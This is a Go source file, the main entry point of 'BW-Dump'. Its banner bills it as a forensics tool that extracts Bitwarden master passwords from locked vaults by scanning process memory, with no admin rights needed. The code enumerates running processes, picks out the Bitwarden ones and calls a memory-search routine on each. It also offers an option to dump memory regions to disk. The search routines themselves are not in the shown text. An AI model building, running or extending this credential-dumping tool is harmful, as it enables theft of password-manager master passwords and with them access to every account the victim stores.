package main

import (
	"flag"
	"fmt"
	"log"

	"github.com/shirou/gopsutil/v3/process"
)

var dumpMemoryOption bool

func init() {
	flag.BoolVar(&dumpMemoryOption, "d", false, "dump memory regions to current directory")
	flag.Parse()
}

func main() {

	fmt.Print(`
 888 88b, Y8b Y8b Y888P    888 88e                                 
 888 88P'  Y8b Y8b Y8P     888 888b  8888 8888 888 888 8e  888 88e 
 888 8K     Y8b Y8b Y  888 888 8888D 8888 8888 888 888 88b 888 888b
 888 88b,    Y8b Y8b       888 888P  Y888 888P 888 888 888 888 888P
 888 88P'     Y8P Y        888 88"    "88 88"  888 888 888 888 88" 
                                                           888     
            Created by @NazMarkuta at Red Maple            888       
`)
	fmt.Println()
	fmt.Printf("BW-Dump is a Windows forensics tool that extracts Bitwarden master passwords from locked vaults\n(must be unlocked at least once) by reading process memory using Windows API functions which\nsearches for magic byte patterns. The tool doesn't require any special (admin) permissions.\n\n")
	fmt.Printf("Now supports Bitwarden Desktop App (v2023.1.1) running on Windows 10 or 11. The tool (may)\nstill support older Bitwarden Chromium extension versions (v2022.6.0) and below.\n\n")

	// Search through all (accessible) processes on the system
	fmt.Printf("[+] Searching for processes...\n")

	procList, err := process.Processes()
	if err != nil {
		log.Fatalf("[!] Cannot retrieve list of processes: %s", err.Error())
	}

	// Filter through processes
	targetProcs, err := getFilteredProcs(procList)
	if err != nil {
		log.Fatalf("[!] No supported processes found!")
	}

	for i := range targetProcs {
		p := targetProcs[i]
		fmt.Println("[+] PID:", p.pidInt)
		fmt.Println("[+] EXEName:", p.exeName)
		fmt.Println("[+] CMDLine:", p.cmdLine)
		searchProcessMemory(int(p.pidInt), p.exeName)
		fmt.Println()
	}
}
